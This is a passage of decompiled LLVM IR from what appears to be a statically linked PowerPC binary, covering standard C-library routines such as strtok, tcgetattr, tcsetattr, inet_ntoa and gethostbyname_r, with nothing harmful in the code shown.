  %v1_1000a4d0 = mul nuw nsw i32 %v3_1000a4c4, 2
  store i32 %v1_1000a4d0, i32* %r9.global-to-local, align 4
  %v0_1000a4d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a4cc, i32 %v0_1000a4d4)
  %v0_1000a4d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a4d8 = inttoptr i32 %v0_1000a4d8 to i8*
  %v2_1000a4d8 = load i8, i8* %v1_1000a4d8, align 1
  %v3_1000a4d8 = zext i8 %v2_1000a4d8 to i32
  %v1_1000a4dc = add i32 %v0_1000a4d8, 1
  store i32 %v1_1000a4dc, i32* %r8.global-to-local, align 4
  %v0_1000a4e0 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000a4e0 = icmp eq i32 %v0_1000a4e0, %v3_1000a4d8
  br i1 %v4_1000a4e0, label %dec_label_pc_1000a4c4.backedge, label %dec_label_pc_1000a4ec

dec_label_pc_1000a4c4.backedge:                   ; preds = %dec_label_pc_1000a4c4, %dec_label_pc_1000a4ec, %dec_label_pc_1000a500
  %v0_1000a4c4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a4c4

dec_label_pc_1000a4ec:                            ; preds = %dec_label_pc_1000a4c4
  %v1_1000a4e4 = mul nuw nsw i32 %v3_1000a4d8, 2
  %v0_1000a4ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4ec = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a4ec = add i32 %v1_1000a4ec, %v0_1000a4ec
  %v3_1000a4ec = inttoptr i32 %v2_1000a4ec to i16*
  %v4_1000a4ec = load i16, i16* %v3_1000a4ec, align 2
  %v5_1000a4ec = sext i16 %v4_1000a4ec to i32
  store i32 %v5_1000a4ec, i32* %r9.global-to-local, align 4
  %v2_1000a4f4 = add i32 %v1_1000a4ec, %v1_1000a4e4
  %v3_1000a4f4 = inttoptr i32 %v2_1000a4f4 to i16*
  %v4_1000a4f4 = load i16, i16* %v3_1000a4f4, align 2
  %v5_1000a4f4 = sext i16 %v4_1000a4f4 to i32
  store i32 %v5_1000a4f4, i32* %r0.global-to-local, align 4
  %v4_1000a4f8 = icmp eq i16 %v4_1000a4ec, %v4_1000a4f4
  br i1 %v4_1000a4f8, label %dec_label_pc_1000a4c4.backedge, label %dec_label_pc_1000a500

dec_label_pc_1000a500:                            ; preds = %dec_label_pc_1000a4ec
  %v3_1000a4f0 = icmp eq i8 %v2_1000a4d8, 0
  %v0_1000a500 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a500 = add i32 %v0_1000a500, 1
  store i32 %v1_1000a500, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000a500, i32* %r8.global-to-local, align 4
  br i1 %v3_1000a4f0, label %dec_label_pc_1000a510, label %dec_label_pc_1000a4c4.backedge

dec_label_pc_1000a510:                            ; preds = %dec_label_pc_1000a500
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000a4c4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a4c4.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10024a68.600 to i32), i32* @r5, align 4
  %v1_1000a520 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10024a68.600 to i32))
  ret i32 %v1_1000a520
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268477752, i32* @lr, align 4
  %v2_1000a534 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a554 = load i32, i32* @lr, align 4
  store i32 %v0_1000a554, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a564 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268477816, i32* @lr, align 4
  %v3_1000a574 = call i32 @ioctl(i32 1076655123, i32 %v2_1000a564, i32 %v2_1000a564)
  %v2_1000a578 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a578, i32* @r4, align 4
  store i32 %v3_1000a574, i32* @r30, align 4
  %v3_1000a57c = icmp eq i32 %v3_1000a574, 0
  store i32 19, i32* @r5, align 4
  %v0_1000a584 = load i32, i32* @r31, align 4
  br i1 %v3_1000a57c, label %dec_label_pc_1000a58c, label %dec_label_pc_1000a5d4

dec_label_pc_1000a58c:                            ; preds = %entry
  %v1_1000a584 = add i32 %v0_1000a584, 17
  %v4_1000a598 = zext i8 %tmp4 to i32
  store i32 %v4_1000a598, i32* @r8, align 4
  %v3_1000a5a4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000a5a4, i32* %r0.global-to-local, align 4
  %v2_1000a5a8 = add i32 %v0_1000a584, 4
  %v3_1000a5a8 = inttoptr i32 %v2_1000a5a8 to i32*
  store i32 %tmp7, i32* %v3_1000a5a8, align 4
  %v0_1000a5ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a5ac = load i32, i32* @r31, align 4
  %v2_1000a5ac = inttoptr i32 %v1_1000a5ac to i32*
  store i32 %v0_1000a5ac, i32* %v2_1000a5ac, align 4
  %v0_1000a5b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a5b0 = load i32, i32* @r31, align 4
  %v2_1000a5b0 = add i32 %v1_1000a5b0, 8
  %v3_1000a5b0 = inttoptr i32 %v2_1000a5b0 to i32*
  store i32 %v0_1000a5b0, i32* %v3_1000a5b0, align 4
  %v0_1000a5b4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a5b4 = load i32, i32* @r31, align 4
  %v2_1000a5b4 = add i32 %v1_1000a5b4, 12
  %v3_1000a5b4 = inttoptr i32 %v2_1000a5b4 to i32*
  store i32 %v0_1000a5b4, i32* %v3_1000a5b4, align 4
  %v3_1000a5b8 = load i32, i32* @r31, align 4
  %v4_1000a5b8 = add i32 %v3_1000a5b8, 16
  %v5_1000a5b8 = inttoptr i32 %v4_1000a5b8 to i8*
  store i8 %tmp4, i8* %v5_1000a5b8, align 1
  %v1_1000a5bc = load i32, i32* @r31, align 4
  %v2_1000a5bc = add i32 %v1_1000a5bc, 52
  %v3_1000a5bc = inttoptr i32 %v2_1000a5bc to i32*
  store i32 %tmp3, i32* %v3_1000a5bc, align 4
  %v1_1000a5c0 = load i32, i32* @r31, align 4
  %v2_1000a5c0 = add i32 %v1_1000a5c0, 56
  %v3_1000a5c0 = inttoptr i32 %v2_1000a5c0 to i32*
  store i32 %tmp2, i32* %v3_1000a5c0, align 4
  store i32 268477896, i32* @lr, align 4
  %v6_1000a5c4 = sext i8 %tmp4 to i32
  %v8_1000a5c4 = call i32 @__GI_mempcpy(i32 %v1_1000a584, i32 %v2_1000a578, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000a5c4, i32 %tmp7)
  store i32 268477908, i32* @lr, align 4
  %v3_1000a5d0 = call i32 @__GI_memset(i32 %v8_1000a5c4, i32 0, i32 13)
  %v0_1000a5d8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a5d4

dec_label_pc_1000a5d4:                            ; preds = %entry, %dec_label_pc_1000a58c
  %v0_1000a5d8 = phi i32 [ %v3_1000a574, %entry ], [ %v0_1000a5d8.pre, %dec_label_pc_1000a58c ]
  store i32 %v0_1000a554, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a5d8

; uselistorder directives
  uselistorder i32 %v2_1000a564, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a5d4, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a5ec = load i32, i32* @r4, align 4
  %v3_1000a5ec = icmp eq i32 %v0_1000a5ec, 1
  %v0_1000a5fc = load i32, i32* @r3, align 4
  store i32 %v0_1000a5fc, i32* @r27, align 4
  %v0_1000a604 = load i32, i32* @r5, align 4
  store i32 %v0_1000a604, i32* @r31, align 4
  br i1 %v3_1000a5ec, label %dec_label_pc_1000a628, label %dec_label_pc_1000a60c

dec_label_pc_1000a60c:                            ; preds = %entry
  %v3_1000a60c = icmp eq i32 %v0_1000a5ec, 2
  br i1 %v3_1000a60c, label %dec_label_pc_1000a648, label %dec_label_pc_1000a614

dec_label_pc_1000a614:                            ; preds = %dec_label_pc_1000a60c
  %v3_1000a614 = icmp eq i32 %v0_1000a5ec, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000a614, label %dec_label_pc_1000a650, label %dec_label_pc_1000a634

dec_label_pc_1000a628:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000a650

dec_label_pc_1000a634:                            ; preds = %dec_label_pc_1000a614
  %v0_1000a634 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000a640 = inttoptr i32 %v0_1000a634 to i32*
  store i32 22, i32* %v2_1000a640, align 4
  br label %dec_label_pc_1000a738

dec_label_pc_1000a648:                            ; preds = %dec_label_pc_1000a60c
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000a650

dec_label_pc_1000a650:                            ; preds = %dec_label_pc_1000a614, %dec_label_pc_1000a628, %dec_label_pc_1000a648
  %v1_1000a650 = inttoptr i32 %v0_1000a604 to i32*
  %v2_1000a650 = load i32, i32* %v1_1000a650, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000a658 = add i32 %v0_1000a604, 4
  %v2_1000a658 = inttoptr i32 %v1_1000a658 to i32*
  %v3_1000a658 = load i32, i32* %v2_1000a658, align 4
  store i32 %v3_1000a658, i32* %r9.global-to-local, align 4
  %v1_1000a65c = add i32 %v0_1000a604, 17
  store i32 %v1_1000a65c, i32* @r4, align 4
  %v1_1000a660 = add i32 %v0_1000a604, 8
  %v2_1000a660 = inttoptr i32 %v1_1000a660 to i32*
  %v3_1000a660 = load i32, i32* %v2_1000a660, align 4
  %v2_1000a664 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000a664, i32* @r3, align 4
  %v2_1000a66c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000a66c, i32* @r26, align 4
  %v1_1000a670 = add i32 %v0_1000a604, 16
  %v2_1000a670 = inttoptr i32 %v1_1000a670 to i8*
  %v3_1000a670 = load i8, i8* %v2_1000a670, align 1
  %v4_1000a670 = zext i8 %v3_1000a670 to i32
  store i32 %v4_1000a670, i32* @r8, align 4
  store i32 %v2_1000a650, i32* %stack_var_-72, align 4
  store i32 268478108, i32* @lr, align 4
  %v0_1000a698 = call i32 @memcpy()
  %v0_1000a69c = load i32, i32* @r27, align 4
  %v0_1000a6a0 = load i32, i32* @r30, align 4
  store i32 268478128, i32* @lr, align 4
  %v3_1000a6ac = call i32 @ioctl(i32 %v0_1000a69c, i32 %v0_1000a6a0, i32 %v2_1000a66c)
  store i32 %v3_1000a6ac, i32* @r28, align 4
  %v3_1000a6b0 = icmp eq i32 %v3_1000a6ac, 0
  br i1 %v3_1000a6b0, label %dec_label_pc_1000a6b8, label %dec_label_pc_1000a738

dec_label_pc_1000a6b8:                            ; preds = %dec_label_pc_1000a650
  %v0_1000a6b8 = load i32, i32* @r30, align 4
  %v3_1000a6bc = icmp eq i32 %v0_1000a6b8, -2144570348
  br i1 %v3_1000a6bc, label %dec_label_pc_1000a6c4, label %dec_label_pc_1000a734

dec_label_pc_1000a6c4:                            ; preds = %dec_label_pc_1000a6b8
  %v0_1000a6c4 = call i32 @__errno_location()
  store i32 %v0_1000a6c4, i32* @r29, align 4
  %v0_1000a6d4 = load i32, i32* @r27, align 4
  %v1_1000a6dc = inttoptr i32 %v0_1000a6c4 to i32*
  %v2_1000a6dc = load i32, i32* %v1_1000a6dc, align 4
  store i32 %v2_1000a6dc, i32* @r30, align 4
  store i32 268478184, i32* @lr, align 4
  %v3_1000a6e4 = call i32 @ioctl(i32 %v0_1000a6d4, i32 1076655123, i32 %v2_1000a66c)
  %v3_1000a6e8 = icmp eq i32 %v3_1000a6e4, 0
  br i1 %v3_1000a6e8, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a6f0

dec_label_pc_1000a6f0:                            ; preds = %dec_label_pc_1000a6c4
  %v0_1000a6f0 = load i32, i32* @r30, align 4
  %v1_1000a6f0 = load i32, i32* @r29, align 4
  %v2_1000a6f0 = inttoptr i32 %v1_1000a6f0 to i32*
  store i32 %v0_1000a6f0, i32* %v2_1000a6f0, align 4
  br label %dec_label_pc_1000a738

dec_label_pc_1000a6f8:                            ; preds = %dec_label_pc_1000a6c4
  %v0_1000a6f8 = load i32, i32* @r31, align 4
  %v1_1000a6f8 = add i32 %v0_1000a6f8, 8
  %v2_1000a6f8 = inttoptr i32 %v1_1000a6f8 to i32*
  %v3_1000a6f8 = load i32, i32* %v2_1000a6f8, align 4
  %v1_1000a700 = call i32 @__asm_rlwinm(i32 %v3_1000a6f8, i32 0, i32 19, i32 20)
  %v1_1000a704 = call i32 @__asm_rlwinm(i32 %v3_1000a660, i32 0, i32 19, i32 20)
  store i32 %v1_1000a704, i32* %r9.global-to-local, align 4
  %v4_1000a708 = icmp eq i32 %v1_1000a700, %v1_1000a704
  br i1 %v4_1000a708, label %dec_label_pc_1000a710, label %dec_label_pc_1000a724

dec_label_pc_1000a710:                            ; preds = %dec_label_pc_1000a6f8
  %v1_1000a710 = and i32 %v3_1000a6f8, 768
  store i32 %v1_1000a710, i32* %r9.global-to-local, align 4
  %v3_1000a710 = icmp eq i32 %v1_1000a710, 0
  br i1 %v3_1000a710, label %dec_label_pc_1000a734, label %dec_label_pc_1000a718

dec_label_pc_1000a718:                            ; preds = %dec_label_pc_1000a710
  %v1_1000a718 = call i32 @__asm_rlwinm(i32 %v3_1000a660, i32 0, i32 22, i32 23)
  %v0_1000a71c = load i32, i32* %r9.global-to-local, align 4
  %v4_1000a71c = icmp eq i32 %v0_1000a71c, %v1_1000a718
  br i1 %v4_1000a71c, label %dec_label_pc_1000a734, label %dec_label_pc_1000a724

dec_label_pc_1000a724:                            ; preds = %dec_label_pc_1000a6f8, %dec_label_pc_1000a718
  store i32 -1, i32* @r28, align 4
  %v1_1000a72c = load i32, i32* @r29, align 4
  %v2_1000a72c = inttoptr i32 %v1_1000a72c to i32*
  store i32 22, i32* %v2_1000a72c, align 4
  br label %dec_label_pc_1000a738

dec_label_pc_1000a734:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a718, %dec_label_pc_1000a710
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a738

dec_label_pc_1000a738:                            ; preds = %dec_label_pc_1000a650, %dec_label_pc_1000a6f0, %dec_label_pc_1000a634, %dec_label_pc_1000a724, %dec_label_pc_1000a734
  %v0_1000a73c = load i32, i32* @r28, align 4
  ret i32 %v0_1000a73c

; uselistorder directives
  uselistorder i32 %v0_1000a604, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 4, 5, 6, 0, 7, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a738, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a734, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a724, { 1, 0 }
  uselistorder label %dec_label_pc_1000a650, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000a750 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a750
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000a754 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a754
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a758 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a758
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a75c = load i32, i32* @r3, align 4
  ret i32 %v0_1000a75c
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000a768 = add i32 %arg2, 15
  store i32 %v1_1000a768, i32* %r4.global-to-local, align 4
  %v2_1000a77c = load i32, i32* %arg1, align 4
  store i32 %v2_1000a77c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a784

dec_label_pc_1000a784:                            ; preds = %dec_label_pc_1000a7a8.dec_label_pc_1000a784_crit_edge, %entry
  %v0_1000a784 = phi i32 [ %v2_1000a77c, %entry ], [ %v0_1000a784.pre, %dec_label_pc_1000a7a8.dec_label_pc_1000a784_crit_edge ]
  %v0_1000a7c88 = phi i32 [ %v1_1000a768, %entry ], [ %v0_1000a7a8, %dec_label_pc_1000a7a8.dec_label_pc_1000a784_crit_edge ]
  %v1_1000a784 = urem i32 %v0_1000a784, 256
  %v5_1000a78c = inttoptr i32 %v0_1000a7c88 to i8*
  %v6_1000a78c = call i32 @_uintmaxtostr(i8* %v5_1000a78c, i32 0, i32 %v1_1000a784, i32 -10, i32 0)
  %v0_1000a790 = load i32, i32* @r30, align 4
  %v3_1000a790 = icmp eq i32 %v0_1000a790, 0
  %v0_1000a794 = load i32, i32* @r31, align 4
  %v1_1000a794 = udiv i32 %v0_1000a794, 256
  store i32 %v1_1000a794, i32* %r31.global-to-local, align 4
  %v1_1000a798 = add i32 %v6_1000a78c, -1
  store i32 %v1_1000a798, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a790, label %dec_label_pc_1000a7a8, label %dec_label_pc_1000a7a0

dec_label_pc_1000a7a0:                            ; preds = %dec_label_pc_1000a784
  %v3_1000a7a4 = inttoptr i32 %v0_1000a790 to i8*
  store i8 46, i8* %v3_1000a7a4, align 1
  %v0_1000a7a8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a7a8

dec_label_pc_1000a7a8:                            ; preds = %dec_label_pc_1000a784, %dec_label_pc_1000a7a0
  %v0_1000a7a8 = phi i32 [ %v1_1000a798, %dec_label_pc_1000a784 ], [ %v0_1000a7a8.pre, %dec_label_pc_1000a7a0 ]
  %v0_1000a7ac.pre = load i32, i32* @r29, align 4
  %v1_1000a7bc = add i32 %v0_1000a7ac.pre, 1
  store i32 %v1_1000a7bc, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000a7ac.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000a7a8.dec_label_pc_1000a784_crit_edge, label %dec_label_pc_1000a7c4

dec_label_pc_1000a7a8.dec_label_pc_1000a784_crit_edge: ; preds = %dec_label_pc_1000a7a8
  %v0_1000a784.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a784

dec_label_pc_1000a7c4:                            ; preds = %dec_label_pc_1000a7a8
  %v1_1000a7c8 = add i32 %v0_1000a7a8, 1
  ret i32 %v1_1000a7c8

; uselistorder directives
  uselistorder i32 %v0_1000a7ac.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a7a8, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000a7f0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a7f0, i32* %stack_var_-8, align 4
  store i32 268478464, i32* @lr, align 4
  %v3_1000a7fc = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1002aac8.601 to i32))
  ret i32 %v3_1000a7fc
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a818 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000a818, i32* @r4, align 4
  store i32 268478500, i32* @lr, align 4
  %v1_1000a820 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000a820 = call i32 @inet_aton(i8* %v1_1000a820)
  %v3_1000a824 = icmp eq i32 %v2_1000a820, 0
  br i1 %v3_1000a824, label %dec_label_pc_1000a834, label %dec_label_pc_1000a830

dec_label_pc_1000a830:                            ; preds = %entry
  %v3_1000a830 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a834

dec_label_pc_1000a834:                            ; preds = %entry, %dec_label_pc_1000a830
  %v0_1000a840 = phi i32 [ -1, %entry ], [ %v3_1000a830, %dec_label_pc_1000a830 ]
  ret i32 %v0_1000a840

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a834, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000a858 = call i32 @__GI___h_errno_location()
  %v2_1000a868 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268478592, i32* @lr, align 4
  %v7_1000a87c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1002aca4.602, i32 ptrtoint (i32* @global_var_1002aad8.603 to i32), i32 460, i32 %v2_1000a868, i32 %v0_1000a858)
  %v3_1000a884 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000a884
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000a89c = load i32, i32* @lr, align 4
  store i32 %v0_1000a89c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000a8a4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000a8c4 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000a8c4, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000a8a4, label %dec_label_pc_1000abc8, label %dec_label_pc_1000a8d0

dec_label_pc_1000a8d0:                            ; preds = %entry
  %v0_1000a8d0 = call i32 @__errno_location()
  store i32 %v0_1000a8d0, i32* %r3.global-to-local, align 4
  %v1_1000a8d8 = inttoptr i32 %v0_1000a8d0 to i32*
  %v2_1000a8d8 = load i32, i32* %v1_1000a8d8, align 4
  store i32 %v2_1000a8d8, i32* @r27, align 4
  store i32 %v0_1000a8d0, i32* %r28.global-to-local, align 4
  %v0_1000a8e0 = load i32, i32* @r31, align 4
  store i32 %v0_1000a8e0, i32* %v1_1000a8d8, align 4
  %v0_1000a8e4 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000a8e8 = load i32, i32* @r23, align 4
  store i32 %v0_1000a8e8, i32* %r3.global-to-local, align 4
  %v0_1000a8ec = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a8f0 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a8f4 = load i32, i32* %r20.global-to-local, align 4
  %v0_1000a8f8 = load i32, i32* @r24, align 4
  store i32 268478720, i32* @lr, align 4
  %v7_1000a8fc = call i32 @__get_hosts_byname_r(i32 %v0_1000a8e8, i32 2, i32 %v0_1000a8e4, i32 %v0_1000a8ec, i32 %v0_1000a8f0, i32 %v0_1000a8f4, i32 %v0_1000a8f8)
  store i32 %v7_1000a8fc, i32* %r3.global-to-local, align 4
  %v3_1000a900 = icmp eq i32 %v7_1000a8fc, 0
  br i1 %v3_1000a900, label %dec_label_pc_1000abc8, label %dec_label_pc_1000a908

dec_label_pc_1000a908:                            ; preds = %dec_label_pc_1000a8d0
  %v0_1000a908 = load i32, i32* @r24, align 4
  %v1_1000a908 = inttoptr i32 %v0_1000a908 to i32*
  %v2_1000a908 = load i32, i32* %v1_1000a908, align 4
  store i32 %v2_1000a908, i32* %r0.global-to-local, align 4
  %v3_1000a90c = icmp eq i32 %v2_1000a908, 1
  br i1 %v3_1000a90c, label %dec_label_pc_1000a930, label %dec_label_pc_1000a914

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a908
  %v3_1000a914 = icmp eq i32 %v2_1000a908, 4
  br i1 %v3_1000a914, label %dec_label_pc_1000a930, label %dec_label_pc_1000a91c

dec_label_pc_1000a91c:                            ; preds = %dec_label_pc_1000a914
  %v3_1000a91c = icmp eq i32 %v2_1000a908, -1
  br i1 %v3_1000a91c, label %dec_label_pc_1000a924, label %dec_label_pc_1000abc8

dec_label_pc_1000a924:                            ; preds = %dec_label_pc_1000a91c
  %v0_1000a924 = load i32, i32* @r28, align 4
  %v1_1000a924 = inttoptr i32 %v0_1000a924 to i32*
  %v2_1000a924 = load i32, i32* %v1_1000a924, align 4
  store i32 %v2_1000a924, i32* %r0.global-to-local, align 4
  %v3_1000a928 = icmp eq i32 %v2_1000a924, 2
  br i1 %v3_1000a928, label %dec_label_pc_1000a930, label %dec_label_pc_1000abc8

dec_label_pc_1000a930:                            ; preds = %dec_label_pc_1000a924, %dec_label_pc_1000a914, %dec_label_pc_1000a908
  %v0_1000a930 = load i32, i32* @r30, align 4
  %v1_1000a930 = sub i32 0, %v0_1000a930
  store i32 %v1_1000a930, i32* %r0.global-to-local, align 4
  %v0_1000a934 = load i32, i32* @r27, align 4
  %v1_1000a934 = load i32, i32* @r28, align 4
  %v2_1000a934 = inttoptr i32 %v1_1000a934 to i32*
  store i32 %v0_1000a934, i32* %v2_1000a934, align 4
  %v0_1000a938 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a938 = urem i32 %v0_1000a938, 4
  store i32 %v1_1000a938, i32* %r0.global-to-local, align 4
  %v3_1000a938 = icmp eq i32 %v1_1000a938, 0
  %v0_1000a950.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000a938, label %dec_label_pc_1000a950, label %dec_label_pc_1000a940

dec_label_pc_1000a940:                            ; preds = %dec_label_pc_1000a930
  %v2_1000a940 = icmp ult i32 %v0_1000a950.pre, %v1_1000a938
  br i1 %v2_1000a940, label %dec_label_pc_1000abc4, label %dec_label_pc_1000a948

dec_label_pc_1000a948:                            ; preds = %dec_label_pc_1000a940
  %v2_1000a948 = sub i32 %v0_1000a950.pre, %v1_1000a938
  store i32 %v2_1000a948, i32* @r29, align 4
  %v0_1000a94c = load i32, i32* @r30, align 4
  %v2_1000a94c = add i32 %v0_1000a94c, %v1_1000a938
  store i32 %v2_1000a94c, i32* @r30, align 4
  br label %dec_label_pc_1000a950

dec_label_pc_1000a950:                            ; preds = %dec_label_pc_1000a930, %dec_label_pc_1000a948
  %v0_1000a950 = phi i32 [ %v2_1000a948, %dec_label_pc_1000a948 ], [ %v0_1000a950.pre, %dec_label_pc_1000a930 ]
  %v1_1000a958 = load i32, i32* @r24, align 4
  %v2_1000a958 = inttoptr i32 %v1_1000a958 to i32*
  store i32 -1, i32* %v2_1000a958, align 4
  %tmp29 = icmp ult i32 %v0_1000a950, 4
  br i1 %tmp29, label %dec_label_pc_1000abc4, label %dec_label_pc_1000a960

dec_label_pc_1000a960:                            ; preds = %dec_label_pc_1000a950
  %v0_1000a960 = load i32, i32* @r29, align 4
  %v1_1000a960 = add i32 %v0_1000a960, -4
  store i32 %v1_1000a960, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000a960, 8
  br i1 %tmp30, label %dec_label_pc_1000abc4, label %dec_label_pc_1000a96c

dec_label_pc_1000a96c:                            ; preds = %dec_label_pc_1000a960
  %v1_1000a96c = add i32 %v0_1000a960, -12
